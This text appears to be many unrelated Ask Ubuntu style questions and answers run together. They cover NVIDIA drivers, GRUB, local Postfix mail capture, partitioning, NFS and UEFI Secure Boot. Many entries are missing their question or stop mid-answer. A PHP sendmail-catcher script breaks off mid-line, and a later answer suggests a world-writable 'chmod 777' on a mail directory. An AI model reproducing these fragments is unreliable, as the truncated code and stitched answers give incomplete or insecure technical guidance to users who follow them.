\n\nA: There is no such feature.\nIf you want this you will need to code it yourself by hacking the software that is used to create and show themes.

After upgrade to 12.10 however, the machine boots into a low resolution desktop which I can not really interact with. I suspect this is due to the driver not being loaded properly. To fix this, I have to switch to ctrl+alt+F1 session and manually load the nvidia_current module and restart the desktop manager:\nsudo modprobe nvidia_current\nsudo service lightdm restart\n\nNow everything works fine again. However, I would like not to have to do this every time I reboot the machine. I also dont want to hack an script to do this on load. Basically, if things are setup currectly, the nvidia_current driver which is installed should load. How can I make sure nvidia_current driver module loads properly when system starts?\nEdit: I tried removing the ppa and installing nvidia-current-update as was suggested in the comments. However, I still face the same problem. The only difference is that now when I restart I come back to desktop with this distorted image:\n\nIt appears that nvidia module is not being loaded properly when system boots, even though working drivers are installed. \nAgain, to work around this issue I can switch to ctrl+alt+F1 session and login. Then I can run this code to get the driver loaded and the desktop back:\nsudo modprobe nvidia_current_updates\nsudo service lightdm restart\n\nI thought it may be that nvidia_current_updates is somehow being blacklisted somewhere or that nouveau driver is not being blacklisted. So I went into /etc/modprobe.d directory and take a look around. I could not find any evidence of that. Here is the content of nvidia-graphic-drivers.conf which seems relevant:\n:/etc/modprobe.d$ cat nvidia-graphics-drivers.conf \n# This file was installed by nvidia-current-updates\n# Do not edit this file manually\n\nblacklist nouveau\nblacklist lbm-nouveau\nblacklist nvidia-173\nblacklist nvidia-96\nblacklist nvidia-current\nblacklist nvidia-173-updates\nblacklist nvidia-96-updates\nalias nvidia nvidia_current_updates\nalias nouveau off\nalias lbm-nouveau off\n\n\nA: Since the ppa:ubuntu-x-swat/x-updates PPA currently doesn't have any packages for Quantal, I'd suggest removing it.\nsudo apt-get install ppa-purge\n\nsudo ppa-purge ppa:ubuntu-x-swat/x-updates\n\nThen install the recommended or experimental Nvidia driver.

Saying that yours is similar to somebody else's just won't cut it; there can be subtle but critical differences between the two.\nYour statement that \"...Ubuntu is loaded but the grub does not appear\" requires clarification. I suspect that what you mean is that the computer boots directly into Ubuntu without first presenting you with a GRUB menu, rendering it impossible for you to boot Windows. If so, then you need to reconfigure GRUB in one way or another. If I've misinterpreted, please elaborate.\nI recommend that you run the Boot Info Script on your system and post a link to the RESULTS.txt file that it produces. This will provide detailed information on your partition layout, enabling further diagnosis.

I've been looking for a way to keep them from appearing in the bar (and taskswitcher). I want to use webapps, since I quite like the idea of integration (especially for google docs and gmail), but I hate when I have ten of them in the sidebar. Is there anyway to use them without them popping up there?\n\nA: To put it bluntly, no. I agree that webapp integration is a great idea, however most of the webapp integration is built around the icon showing up in the launcher. The idea (as far as I can tell) is that when you right click the webapp launcher icon, common tasks appear, and when you close the webapp, it is easy to open it again right away.\nIf you were simply looking for something to launch the webapp, my suggestion would be to create .desktop files instead of using Unity's integration.\nTHIS IS FOR MODERATELY ADVANCED USERS. if you are new to Linux, a google search on .desktop files would be a good idea before getting started.\nFor instance, if you wanted to launch Google Calendar from Firefox and the Dash, but did not want it to show up in the launcher, you might create a file that looks like this:\n[Desktop Entry]\nName=Google Drive\nExec=firefox http://drive.google.com/\nIcon=google\nType=Application\nComment=A quick launcher for Google Drive\nOnlyShowIn=unity;\n\nThis would simply show up as Firefox in the launcher, however in the Dash it would show up as Google Drive. If you are using Ubuntu 12.10 or later, right clicking on this icon would give you the icon, name, and whatever you type as a comment.\nJust save the file, then open the preferences dialog after right clicking on it in the file manager. You should see a tab that says \"permissions,\" and a checkbox that says \"Allow executing file as program.\" Check this box, then run sudo nautilus in a terminal. In the new file browser window, navigate to /usr/share/applications. Drag your newly created file from your file manager into the one we created in the terminal. Close the file managers, and log out and back in. You should see the launcher you made in the dash when you search for its name.\n", "Q: Can't Install 12.04 on Dell Latitude C400 I have a Dell C400 that had Windows 2000 on it.

If md5sum is correct than there are no chances of occuring such problems.  You can't find util-linux_2.20.1-1ubuntu3_i386.deb as you mentioned in question, because they are inside larger file named filesystem.squashfs.\n\nA: As things can go wrong in the CD burn process you should also check the CD intgrity before starting, as described here.\nAs an aside, with only 500MB of RAM, you may be better off with Lubuntu.\n", "Q: Ubuntu 12.04.1 SW RAID GRUB \"out of disk\", but works when I remove one disk I have installed Ubuntu 12.04.1 LTS AMD64 on an old Dell D630 with 2x 1 TB HDDs in a RAID1 array.

I installed Ubuntu 12.10 alongside Windows but now I want to permanently remove it from my computer as I find it quite uncomfortable to have to choose which OS to boot at startup time.\nHow can I remove it without affecting my Windows system?\n\nA: This question appeared in my 'dashboard' as active but I've just realised it's from over 5 years ago - it looked active because Community has marked it for being moved. But whilst I'm here anyway I'll add a little to it:\n@phoibos offers decent advice to answer the question asked and then points in the direction of 'you don't need to get rid of Ubuntu to get the functionality asked for'.\nRemoving Ubuntu and getting Windows to re-write the bootloader afterwards is an awful lot more hassle than just changing a couple of lines in the grub file located in the /etc/default folder.\n\n\n*\n\n*Open up a terminal and type sudo nano /etc/default/grub \n\n*Change GRUB_DEFAULT=0 to GRUB_DEFAULT=saved \n\n*Add GRUB_SAVEDEFAULT=true on a new line below it.\nFrom there you can press Ctrl + o to save your changes ('Write Out'), enter to accept the filename 'grub' and then Ctrl + x to exit.\nIf you prefer you can just press Ctrl + x once you've made your changes, y to accept the offer to save your changes and then enter to accept the filename.\n\n\n*\n\n*When you run sudo update-grub to update your new grub adjustments, then the last Operating System that you successfully booted will be the default option.\nSo if you usually end up running Windows, then when you switch on your machine it will be the option highlighted in the grub menu. If you don't choose something else then it'll get on with booting it when the timer runs out (or you press enter).\nUsing the same method, you can also change the GRUB_TIMEOUT=10 to just a few seconds if you prefer to get on with booting your usual choice more quickly.\nKeeping another Operating System on your machine may turn out to be surprisingly useful if something unexpected happens to your main system.\n(This assumes that you can spare 15 - 20 GB or so on your storage device, although some of the lighter distros take up even less space even with a bunch of useful programs installed).\nAlso, Community, don't worry about deleting/moving this answer if you'd prefer - I've saved a copy in case something similar is asked again ;)\n\nA: Get rid of Ubuntu:\nBoot your windows boot disc and fix the master boot record to get rid of Ubuntus Grub menu.\nThe process is described here: \nhttp://www.howtogeek.com/howto/32523/how-to-manually-repair-windows-7-boot-loader-problems/\nIf you rebooted to Windows and didn't encounter the Grub menu, you're free to do with Ubuntus partitions whatever you please (if you don't have any valuable data on its partitions).\nA (IMHO) better alternative:\nKeep Ubuntu, but make the default entry for the Grub boot loader Windows.

You have to do two things:\n\n\n*\n\n*Add the configuration options discussed in SMTP server to deliver ALL mail to user@localhost, add the following to your /etc/postfix/main.cf file:\nluser_relay = MYLOCALUSER@localhost\nlocal_recipient_maps =\n\n\n*Using the following answer on serverfault ( https://serverfault.com/questions/133190/host-wildcard-subdomains-using-postfix), I added the following (note that you need the postfix-pcre package installed):\nIn /etc/postfix/main.cf:\n mydestination = pcre:/etc/postfix/mydestinations\n\nIn /etc/postfix/mydestinations\n/.*/         ACCEPT\n\nThis will deliver ALL mail that postfix handles to the configured local user defined in #1, so don't use this for anything other than development.\n\nA: \n\"Because this is for development purposes, and I need to test with e-mail addresses other than my own, I need a way for the sendmail command to accept a mail but not actually deliver it, but rather archive is somewhere where I can look at it.\"\n\nYou'll still need to deliver it.  You just need to override \"where\" it's delivered.\n\n\"What is the easiest way to install a mail server such that the sendmail command routes ALL mail to a local directory? i.e. I do NOT want any mail to be delivered to the internet.\"\n\nThis can actually be done using only the default postfix installation package (no need for postfix-pcre).\n1.) Following a tutorial here, edit 2 lines in the /etc/postfix/master.cf file to prevent any mail from being delivered externally (it gets stuck in the local mail queue):\nsmtp      unix  -       -       -       -       -       local\nrelay     unix  -       -       -       -       -       local\n\n2.)  Create a file in /etc/postfix called virtual.  Place the following line within that file, replacing <USERNAME> with the local user account name you want all mail to be delivered to:\n/.*/    <USERNAME>\n\n3.)  Run the following command to create the correct database file for postfix to look-up this new \"virtual alias map\".  The new, autogenerated database file will be called \"virtual.db\"\nsudo postmap /etc/postfix/virtual\n\n4.)  Add the following line to /etc/postfix/main.cf\nvirtual_alias_maps = regexp:/etc/postfix/virtual\n\n5.)  Restart postfix:\nsudo service postfix restart\n\nNow all mail, regardless of the sender, recipient or program that points to this SMTP server, will be delivered locally to the specified user.  There are numerous options to read / retrieve these messages now.  If you install an IMAP or POP3 courrier (such as dovecot), you can use a Mail User Agent (Thunderbird, Outlook, etc.) to connect to your local mailbox and read the messages.\n\nA: See another cool approach here How to catch emails sent with PHP on your local server.\n$ sudo mkdir /var/log/mail\n$ sudo nano /usr/local/bin/sendmail\n\nAdd following PHP script to this new \"sendmail\" file:\n#!/usr/bin/php\n<?php\n$input = file_get_contents('php://stdin');\npreg_match('|^To: (.*)|', $input, $matches);\n$filename = tempnam('/var/log/mail', $matches[1] .

Also you might want to add shell_exec(\"chmod 777 /var/log/mail/ -R\"); to /usr/local/bin/sendmail\n\nA: Another approach is to run a \"FakeSMTP\" server, a cross platform SMTP handler; who's whole purpose is to receive emails, store and display them with your configured email client.\n\n\nA: I have exactly a similar environment. But most online documentation about setting up Postfix advise you to choose Internet Site during the installation process. I think this is an overkill for a local development server on my machine only. So for me, I do the following\n\n\n*\n\n*Assuming /etc/hostname contains MyDevMachine; I ensure that /etc/hosts contains an entry 127.0.1.1    MyDevMachine\n\n*When I install Postfix, I would choose Local only, then for the domain setting, I make sure MyDevMachine is set.\n\n*Because I want all emails to be sent to my the development user, and assuming the name of this development user on Ubuntu is devuser; I therefore create a file called /etc/postfix/vmaps. The content of this file is /.*/   devuser. This would allow all emails to be delivered to devuser\n\n*I then run sudo postmap /etc/postfix/vmaps that eventually creates vmaps.db (sort of activating that virtual mapping).\n\n*Locate the file /etc/postfix/main.cf and append it with following line of code (which will direct Postfix to use the virtual mapping created earlier): virtual_alias_maps = regexp:/etc/postfix/vmaps\n\n*Restart Postfix sudo service postfix restart\n", "Q: What do the colors in Power Statistics mean? I was looking at my power statistics and noticed three different colors are used: green, blue and red. What do they mean?\n\n\nA: I looked through the source code for the GNOME Power Manager which provides the Power Statistics tool. There seem to be no other documents which explain the colors. \nIn the answer I point to the lines of code which support the statements I make instead of pasting the code here. See the gpm-statistics.c file for the lines of code I speak of. The file can be found in the gnome-power-manager-3.16.0.tar.xz archive. At most places that I mention a color I also mention the RGB values for the color in parenthesis. The code specifies the RGB values in that order too (line 822) as opposed to BGR or some other order. \nThe source (lines 907-919) revealed that there are more than just the three colors of Red (255,0,0), Green (0,255,0) and Blue (0,0,255). The code makes use of two other shades of Red and Blue, these colors being RedOther (200,0,0) and BlueOther (0,0,200) and a White (255,255,255) as well, although the White shows up only when you pick the \"Rate\" Graph Type (lines 915-916). \nThe colors correspond to one of seven states (lines 352-380). These states are:\n\n\n*\n\n*UP_DEVICE_STATE_CHARGING which is \"Charging\"\n\n*UP_DEVICE_STATE_DISCHARGING which is \"Discharging\"\n\n*UP_DEVICE_STATE_EMPTY which is \"Empty\"\n\n*UP_DEVICE_STATE_FULLY_CHARGED which is \"Charged\"\n\n*UP_DEVICE_STATE_PENDING_CHARGE which is \"Waiting to charge\"\n\n*UP_DEVICE_STATE_PENDING_DISCHARGE which is \"Waiting to discharge\"\n\n*UP_DEVICE_STATE_UNKNOWN which is \"Unknown\"\n\n\nThe states are assigned colors as (lines 900-919):\n\n\n*\n\n*\"Charging\" is Red (255,0,0)\n\n*\"Discharging\" is Blue (0,0,255)\n\n*\"Waiting to charge\" is RedOther (200,0,0) (This probably explains your red-and-discharging comment)\n\n*\"Waiting to discharge\" is BlueOther (0,0,200) (In some experimentation this seemed to show up when I had my laptop plugged in and on standby, so the BlueOther line climbs up)\n\n*\"Charged\" is Green (0,255,0) (Take this with some extra skepticism since I did not understand the code entirely at this point)\n\n*\"Unknown\" has no color assigned. (This too with skepticism)\n\n\nThat said though, I still cannot glean from the code what the \"Waiting to discharge\" and \"Waiting to charge\" mean exactly. \n\nA: Can't verify 100%, but it seems reasonable that:\ngreen = charging, in use\nblue = discharging, in use\nred = charging, not in use\n\nA: After checking power history a few times and remembering what I did, I've concluded it's either extremely complicated and impossible to decipher, or we have to accept some statistical anomalies and it's as simple as\n\n\n*\n\n*Green = charged\n\n*Blue = discharging\n\n*Red = charging\n\n\n\n", "Q: How to completely erase hard drive? \nPossible Duplicate:\nHow can I securely erase a USB hard drive?\nHow to delete file(s) in secure manner? \n\nI am looking for software/script/whatever that can completely destroy data on hard drive.

(Obligatory warning : Back up your Windows data if you haven't.) \nYou can partition/resize in either Windows or Ubuntu/Linux.\nIn one case, I had to use a utility in Windows to actually create an ext3 partition in the free space that Ubuntu would see.  After that, I was able to boot the Ubuntu DVD, and was finally able to select the ext3 partition and format it to ext4 for Ubuntu without harming the existing Windows installation. \n", "Q: creating extended partition this is my current hard disk status(Running linux Mint LIVE CD) \ni have-\n\n  \n*\n  \n*Ubuntu 12.04 on 206 GB partition at dev/sda1.\n  \n*dev/sda2 system reserved.\n  \n*Windows 7 on 90GB partition at dev/sda3\n  \n*and linux swap in extended partition.\n  \n\nwhat i want to do-\nI want to install Linux mint KDE on my system for that i want to create a new partition of 30GB(by shrinking the free space available at dev/sda1), i can't create that because i can create only 4 Primary partitions which are already there.\n so do i have to delete the Swap partition? and if i did how to force Mint KDE and Ubuntu 12.04 to use/share same swap space in new logical partition?\n\nA: This is an unfortunate situation for you.  Re-sizing sda1 will not allow you to expand the size of the logical partition, because the space must be contiguous, and there is another partition between sda1 and the extended area.  \nBoth Linux installs can share one swap partition.  When you are setting up the partitions, just tell the installer to use the already existing swap.\nHave you considered a 2nd hard drive?\n\nA: There are a number of possible solutions, but the one I recommend is as follows:\n\n\n*\n\n*Back up all your important data. Partition moving and resizing operations are inherently dangerous, so things occasionally go wrong when performing steps like the following. Having a backup ensures you won't lose irreplaceable data.\n\n*Boot a Linux emergency disc, such as Parted Magic or the Ubuntu installer in its \"try before installing\" mode.\n\n*Launch GParted.\n\n*Using GParted, shrink /dev/sda1.\n\n*Using GParted, delete both swap (/dev/sda5) and the extended partition that holds it (presumably /dev/sda4).\n\n*Optionally, using GParted, expand /dev/sda3 into the space freed by the previous step. Alternatively, you can just leave blank space there.\n\n*Create a new extended partition in the blank space left by step #4.\n\n*Create a new swap partition inside the extended partition.\n\n*Create new partition(s) for Linux Mint inside the extended partition. Alternatively, you could leave this to the Mint installer.\n\n\nThe result will be a legal, if somewhat odd, partition table. One drawback is that this procedure leaves your Windows installation the same size as or bigger than it is now. If you wanted to use some of the Windows space for Mint, you'd need to shrink and move the partition, which is the riskiest type of partitioning operation. It's also likely to leave Windows unbootable until repaired. Overall, it's best to avoid this if possible -- and given your stated goals, it seems to be possible to avoid it.\nIn theory, both Ubuntu and Windows should remain bootable after this procedure; however, it's conceivable that one or both OSes might be rendered unbootable. If so, you'll need to repair bootability with an emergency system. The details of how to do this depend on the details of the problem, so I won't address those details here; I just want you to be aware that there's a small but real risk of this happening, and that the problem can be overcome if you encounter it.\n", "Q: Find the icon for a specific file type Is there any way to find the icon for a specific file type?

I'm quite sure MakeMKV can also handle DVDs, so it might be your one-stop solution for the conversion process. It has a simple GUI and a command-line utility. By default the GUI will choose a title (or titles) for you based on some heuristic, and put the corresponding original MPEG stream inside a MKV container.\nMakeMKV has closed source parts, which are proprietary software.

A port of the OS X /usr/bin/security somewhere for example?\nA definitive \"no\" would be as useful as a \"yes\".\n\nA: If you are not afraid of a small amount of scripting, there is a python wrapper for the security command with a short tutorial here.  I have never had to do this before, so I can't speak to its efficacy.\n\nA: I think you don't have a similar tool in Linux to do that. \nFrom all the tools i have seen, they all require that you have Mac OS X to use them.

There might be some hackish way to do it, but your not supposed to be able to. \nThe OS X keychain uses Triple DES as its encryption algorithm which is quite secure, but it is growing older and has been superseded by newer encryption algorithms with longer key lengths.

The link to the keynote video is here\nAny help would be appreciated.\n\nA: Where there is a will, there is a way.  Apple changes links and their website around frequently, but in general, what you have to do is this:  open the page source.  Look for urls or javascripts that seem like they will open the video stream.  They used to have bare urls, but now there is usually some javascript that does the job.  I would look for something with edgesuite.net (or events.apple.com) in it.  I found http://events.apple.com.edgesuite.net/1210pibasdfvoihbadsv/event/url.js\nI opened the js file and found:  \n/*snowLeopard url*/\nvar slURL = \"http://qthttp.apple.com.edgesuite.net/1210pibasdfvoihbadsv/sl_vod_mvp.m3u8\";\n\n/* non-snowLeopard url*/\nvar nonSlURL = 'http://stream.qtv.apple.com/events/oct/1210pibasdfvoihbadsv/12poibnasfdvpiajbafvpihjbasfvpiubfsv10_350_vod_ref.mov';\n\netc.\nI took the Snow Leopard URL and tried opening it in VLC (using \"open network stream\") and it didn't work initially.

My client machine is showing incorrect file ownerships.\nThis is my idmapd.conf file on both machines:\n[General]\n\nVerbosity = 0\nPipefs-Directory = /run/rpc_pipefs\nDomain = localdomain\n\n[Mapping]\n\nNobody-User = nobody\nNobody-Group = nogroup\n\n[Translation]\nMethod=nsswitch\n\nYet, the client shows the ownership of files based on the numerical uid/gid instead of mapping the user and group names.  I have the same user names on both machines, but the uids are not the same.  So when I ls -l the directory on the client, it shows the files as owned by a different user which shares the same uid as the intended user on the server.\nWhat am I doing wrong?\n\nA: The file looks correct, perhaps the idmapd daemon is not running on one of the machines (check with pgrep rpc.idmapd)?\nIs the mount actually done with NFS4? Check the output of mount on the client.\nIt might be possible to block the idmapd daemon with the TCP wrapper. Do the files /etc/hosts.deny and /etc/hosts.allow exist and have any content?\nNote that even if you get it to show the correct user names on the client, it will not work as you want. Whenever you try access the files, the permission checking is done only with the numerical ids (without any translation between client and server). The translation is only done for the output of ls, not for the actual file accesses. So I guess you can stop trying at all, because this is probably not what you want.\nThe only solution for this is to sync the ids on client and server, or use Kerberos (which is very complex).\nThe source of my information is this bug report on Launchpad and this thread in the linux-nfsv4 mailing list\n", "Q: Upgrading Win7 to Win8 on a dual boot with Ubuntu 12.04 Please can someone comment if my current setup of Windows 7 with dual boot of Ubuntu 12.04 will continue to boot and work OK after upgrade my win 7 to win8 OR are there things I need to do first?\nthanks\n\nA: Installing Windows will cause for the Windows bootloader to take the place of GRUB (the Linux bootloader).  After the install, only Windows will boot.\nTo fix this, you need any live CD/DVD with Ubuntu/Fedora/Debian/etc.\nAfter upgrade you need to boot with this live CD/DVD and repair the GRUB2 bootloader.\nFor repair you should do this:\n\n\n*\n\n*For example, you boot with Ubuntu life CD\n\n*Press [Alt]+[F2] and type gnome-terminal\n\n*Then you need to know your disk partitioning. execute this command (in the terminal) for it:\nsudo fdisk -l\n\nYou should see sth like that:\n/dev/sda1 29 8369 66999082+ 83 Linux\n/dev/sda2 * 8370 13995 45190845 7 HPFS/NTFS\n/dev/sda3 13996 14593 4803435 5 Extended\n\nYou can see, that Linux partition (in this option)is /dev/sda1\n\n\n*\n\n*Let's mount it in the /mnt directory with this command:\nsudo mount /dev/sda1 /mnt\n\n\n*After that you have to write grub into the MBR, type this:\nsudo grub-install --root-directory=/mnt /dev/sda\n\n\n*You should see the grub menu at the next boot. If you don't, do the speps 1-4 again and after that execute this command:\nsudo update-grub --output=/mnt/boot/grub/grub.cfg\n\nGood luck!\n\nA: You need to be very careful as Windows 8 will probably clobber you MBR (boot area). Basically this means you will only be able to boot into Windows 8 even though Ubuntu will still be there on another partition (just invisible to the boot loader). There a numerous guides showing how to backup and restore your boot area post windows installation. I'm sure they will work for windows 8 but maybe someone with more specific knowledge of windows 8 installation can chime in just to make sure I don't point you to some out of date or incorrect information. \nObviously - Make sure you backup you system beforehand anyway...\n", "Q: Ubuntu 12.04 Desktop & Taskbars \nPossible Duplicate:\nHow to revert to GNOME Classic? \n\nJust installed Ubuntu 12.04 on a spare drive and don't like the desktop & taskbars.

I would like to use an overlay for files that need to be changed for the computes.

That bug means NFSv3 and overlayfs currently can't play nice together for the copy-on-write functionality you're looking for. Although once that's fixed, I do think using overlayroot is probably the best way to add the needed initramfs magic.\nWith the above bug, you can create files in the upperdir that don't exists in the lowerdir, but the copy-up from the lowerdir to the upperdir is what's broken.

I have a number of NAS devices on my home network and on a previous install of 12.04 and version prior mounting at login worked using this entry for each in fstab:\n//servername/sharename /media/windowsshare cifs    guest,uid=1000,iocharset=utf8,codepage=cp850,cp850 0 0\n\nNow when I use this, 12.10 reports the standard - cannot mount bad option ... blah blah...\nThe kern log reports that the CIFS option \"codepage\" unknown... changed entry to \"unicode\" and received the same error message. There are no other error messages or log entries that would indicate another issue, but this is the statement I used for quite awhile with version 12.04 and before.\nIs the codepage option obsolete in 12.10/CIFS now? Is there a codepage support program that I must load? Is there some kind of helper program that is required to supports the codepage option?\nA current review of the man pages at samba.org does not make mention of the option \"codepage\". \nExtremely confused - any help/insight would be greatly appreciated.\n\nA: codepage option is longer time obsolete, but now you cannot mount with this option in /etc/fstab\nSo remove this option and try again.\n\nA: I had similar problems since my upgrade to 12.10 and solved them through installing cifs-utils:\nsudo apt-get install cifs-utils\n\n\nA: You need to remove the following mount options, as it appears that they' are no longer supported:\ncodepage=cp850,cp850\n\nI had pretty much the same line in my fstab, except my encoding was unicode instead of cp850.\n//192.168.1.32/volume_1                   /media/nas      cifs    guest,uid=noel,gid=noel,iocharset=utf8,codepage=unicode,unicode 0       0\n\nOnce I removed codepage=unicode,unicode, it mounts for me at boot time.

It is going well. Some little issues, but just normal for a recent version. The problem that is really boring me and I can't find the solution is that my desktop is frequently getting dark. All the windows, the wallpaper and the top bar are getting dark. But not the Unity bar. It is like when a programs is not working. I can't predict when but it happens every day. If I close and reopen some program, it gets normal. But only this one, not the others. The only solution is restart Ubuntu.\nSomebody has the same problem? Any tip?\n\nA: The first thing to do is find out what program or programs are using most of the cpu.  I run top in command line in these cases and the solution usually suggests itself once you know what is going on. \nI also run Gkrellm on my desktop to keep tabs on the health of the OS and it usually gives a heads-up when something is not playing nice.  Gkrellm is installable from the repositories and is very configurable, and uses krells as well as bar graphs.  Some people like Conky because it can be made to look pretty, but Gkrellm with default theme is very functional:\n\nI particularly like how Gkrellm uses different colours for the CPU graph - brown for system, blue for user, and green for applications with very high nice levels (usually daemons that use a lot of CPU but give it back when system or user programs need it.)  Also, disk, memory, and network reads are in blue while writes are in brown.  Neat.\nI have noticed on my new 12.10 64 bit install that Firefox has been hogging the CPU on occasion, but  I will be installing 32 bit on this faster dual core machine to see if the problem persists.\nI've also noticed that 12.10 has higher memory requirements than previous versions - about 712 Mb for 12.10 64 bit with Firefox, Transmission and a terminal window running.  Gkrellm can keep tabs on memory and cache for you as well, or type 'free' on the command line.\n", "Q: Is there a PROPRIETARY driver (NVIDIA or ATI) that actually works with 12.10? NOTE: I see many similar topics on this, but I've tried all their suggestions, and nothing has worked. THE MAIN DIFFERENCE SEEMS TO BE: I always get a black screen with a blinking cursor, while others seem to get through the boot-up and see distorted graphics or just their wallpaper. \nISSUE:\n\nI do a clean install of Ubuntu 12.10. Boots fine with the “nouveau” graphics driver – graphics (even just menus) are very slow, choppy, and distorted. The three other driver options in Ubuntu (official NVIDIA drivers), all result in a variation of the black screen on boot up.

I don’t want to put much money into it, as I have seen Ubuntu run great on much older/less capable machines. I’ve got a decent'ish Core2Duo Intel processor (2.13Ghz), 2GB of RAM, 320GB hard drive, 32-bit architecture, and there is no other O/S installed.

See \"answer\" below for summary.\n\n\nA: Install the linux sources and headers. These are required to build the driver.\nsudo apt-get install linux-source linux-headers-3.5.0-17-generic\n\nThen unistall any nvidia drivers you have installed. Then reinstall the nvidia driver\nsudo apt-get install nvidia-current\n\nThen restart the computer\nsudo shutdown -r now\n\nIt should now boot up using the nvidia drivers.\n\nA: Note: This issue has been resolved by way of a hardware replacement, a solution (in regards to software) was not reached. This answer is intended to save people (with similar circumstances) time. On my system, and being fairly new to Linux...I could not get any NVIDIA drivers to work, after trying two different cards. \n\nThe solution for me was an AMD card, with the AMD/ATI proprietary drivers (all versions available in Ubuntu work).

I only started using Ubuntu a couple months ago.  I've been able to get pictures from my camera onto the machine.  The system is very different for me and I'm trying to work it out on my own, but I have a homework assignment that requires me to upload JPG files of photos I take and I'm having a problem.  \nWhen I click the button on the page to choose a file, I go into the different photo files and nothing shows up, but the screen where files would be turns a very faint orange, just a tint.  I've tried putting the named photos on my desktop, but the upload screen doesn't recognize it at all.  \nHow can I use this software to upload my pictures?\n\nA: First, here are Shotwell's help pages for Publishing to the web , and for Exporting photos. You would be publishing images (and uploading over the Internet) if your target is a service like Facebook, or Picasa, or Flickr, something like that. You would be exporting images if your target is another folder or local drive or a USB key, for example. Since I'm unclear on exactly what you need I'll explain several options.  \nExporting\nIf you just need to choose a set of images already in Shotwell, and you can bring them to class on a memory card or burned CD, or even use a network drive at the school, then use the Export function. Plus, if you are shooting RAW or some other format, and need to convert to JPEG before uploading, you are going to use the Export function first, even if you are uploading to a web service later. Exporting can both move files and convert image formats, so you may need both functionalities. \n\n\n*\n\n*Open Shotwell.\n\n*Select one or more images.\n\n*Shift + Ctrl + E to bring up the Export dialogue.\n\n*Choose your export options, file format, size, etc.\n\n*Now just pick a target and your photos are exported, done.\n\n\nPublishing\nShotwell can currently Publish to the following online services: Facebook, Flickr, Picasa Web Albums, Piwigo, Tumblr, Yandex.Fotki, and YouTube. If your target isn't one of these your only option is to Export, explained above.  If you are using one of these services follow the steps below.  \n\n\n*\n\n*Open Shotwell.\n\n*Select one or more images.\n\n*Shift + Ctrl + P (or click the\nPublish button on the bottom toolbar) to bring up the Publish\ndialogue.\n\n*From there, the steps vary slightly depending on the service. Follow\nthe prompts to log-in with the target service, hopefully it is easy\nfrom that point on.  \n\n\nIf you run in to problems just edit your question with which step you are stuck at, so we can edit the answer and make it better.  \nOther options\nAlso, if you want a really simple option you can just put the pictures for your homework assignment in your Ubuntu One folder at which point they are automatically uploaded to your Ubuntu One cloud folder (assuming you have configured the service). Dropbox is another good choice, with the added benefit of having a public photo gallery that you could use to show off the photos. \n", "Q: How to understand Ubuntu UEFI Secure Boot install? Now that Secure Boot is supported, what special instructions does one have to follow to install Ubuntu on a UEFI Secure Boot enabled PC shipped with Windows 8?\nAs I understand, Ubuntu >= 12.04.2 ships with signed GRUB2. I searched but cannot get past the \"supported\" statement. I am looking for specific instructions on registering Ubuntu keys to let the firmware boot Ubuntu. \nUPDATE:\nThanks. SecureBoot in Ubuntu 12.10 gives me the answer. The Ubuntu first-stage EFI bootloader is signed by Microsoft. The last time I read, Ubuntu had plans to publish their own key which had to be registered in the firmware's database before installing. May be I did not track the story long enough to realize that it is not the case anymore.\n\nA: There is a problem on some machines, particulary laptops - They don't appear to have the \"Microsoft Windows UEFI Driver Publisher\" public key installed in their BIOS to allow the signed Ubuntu boot loader (and other UEFI software such as ours)  to run with Secure Boot option enabled. This is NOT the same key, which Microsoft use to sign their own UEFI Windows Boot Manager and it appears that some BIOS implementations only have this Microsoft exclusive public key.\nThe solution is either:\n\n\n*\n\n*For Microsoft to sign third party UEFI binaries with the SAME key as they use for their own bootloader.\n\n*For BIOS vendors/computer hardware motherboard manufacturers to be sure they include the data to allow \"Microsoft Windows UEFI Driver Publisher\" signed binaries to work correctly.\nOn a Windows 8 machine,  enter Mountvol Z: /S in an admin elevated command prompt box. Then in the command prompt do: \ncopy Z:\\EFI\\Microsoft\\*.efi    C:\\test\n\nWhere Z is an unused drive letter.\nYou can then check in (already created) C:\\test folder the digital signatures on the Microsoft .efi files and see that the name of the key is different to the key they used to sign the Ubuntu boot loader.\nThe Ubuntu boot files can be found in X:\\EFI\\Boot where X is the CD drive letter.\nThis needs sorting out, and sorting quickly.\nOur research indicates that of laptops tested so far, only ASUS laptops have the correct keys installed in their bios, but we haven't yet managed to check everyone. I am not mentioning here, the names of machines which won't work, but one is a similar name to the one which does!\n\nA: Probably start here: help.ubuntu.com/community/UEFI\nUEFI (~EFI) is a firmware interface that is widespread on recent computers, especially those more recent than 2010. It is intended to replace the traditional BIOS firmware interface that is prevalent on earlier machines. This page provides information about installing and booting Ubuntu using EFI, as well as about switching between EFI mode and legacy BIOS mode using Ubuntu.\n\nUPDATE:\nUbuntu 12.10 is intended to be able to be used with Secure Boot.\nSoftpedia (Sep-2012) >> Canonical Unveils Plans for Ubuntu 12.10 Secure Boot\n\nCanonical, through Jon Melamut, announced on September 20th that they will plan to implement support for Secure Boot in the upcoming Ubuntu\n  12.10 (Quantal Quetzal) operating system.\nTherefore, after a discussion with Free Software Foundation, Canonical decided to drop the EFILinux bootloader implementation in\n  favor of the GRUB2 bootloader one, signed with their own keys. ..\n\nMuktware (Oct-2012) >> SecureBoot In Ubuntu 12.10\n\nUbuntu 12.10 is the first distro that supports the Secure Boot architecture by default. Canonical developers have spent a huge amount\n  of time making sure that Ubuntu runs fine and without problems in all\n  hardware. Steve Langasek, an Ubuntu developer has put forward a nice\n  account in his blog, regarding how they are making Secure Boot\n  supported.\n\ncloses with ..\n\nLangasek says that they will backport the secure boot mechanism to Ubuntu 12.04 release as well, so that the LTS version can be installed\n  in Secure Boot devices. So the next major service pack of Ubuntu\n  Precise (12.04.2) will include support for SecureBoot.\n\n\nA: *\n\n*First install Ubuntu-Secure-Remix-64bit (or Ubuntu12.10 64bit) and use Boot-Repair's Recommended Repair as described in the first paragraph of https://help.ubuntu.com/community/UEFI\n\n*If that fails, disable SecureBoot in your firmware as described here: https://help.ubuntu.com/community/UEFI#SecureBoot , and run Boot-Repair again.\n\nA: Have posted a similar question six months ago and due to being unable to load kernel led to installing a non-linux alternative OS to prove that my firmware and hardware were at least working as expected.  The intention was to have this new hardware be my first that had never seen Windows so maybe next time...  \nSince starting on the quest to make use of the EFI capabilities of my newest hardware have been spending some time on these very useful pages which includes a good synopsis of how to perform an Ubuntu install on a Secure Boot enabled machine and highlight there are other options other than relying on Grub2 and signed keys from Microsoft. Which the link in your update to question indicates as the be all and end all.  Just thought would share this is not the case. As the last link in this paragraph shows using rEFInd and your own keys it is possible to manage a linux install with Secure Boot enabled. Which is one of the many options mentioned if not described in detail. Hope you enjoy the reading as much as I! \nThe alternative is to turn Secure Boot off. I would personally at least try the method described shortly and 